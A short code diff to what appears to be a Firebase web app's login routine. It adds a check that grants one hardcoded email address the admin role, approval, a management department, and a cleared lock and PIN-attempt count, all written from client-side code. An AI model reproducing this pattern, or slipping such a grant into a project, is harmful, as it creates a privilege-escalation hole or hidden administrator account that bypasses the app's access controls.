@@ -806,6 +806,19 @@ if(!snap.exists() && user.providerData[0]?.providerId === 'google.com'){
   }
 
   CD=snap.data();
+if(((user.email || '').trim().toLowerCase()) === 'abhi.codex48@gmail.com'){
+  await updateDoc(doc(db,'users',user.uid), {
+    role: 'admin',
+    approved: true,
+    department: 'Management',
+    locked: false,
+    pinAttempts: 0
+  });
+
+  snap = await getDoc(doc(db,'users',user.uid));
+  CD = snap.data();
+}
+  
 
   // Check locked
   if(CD.locked && CD.role !== 'admin'){
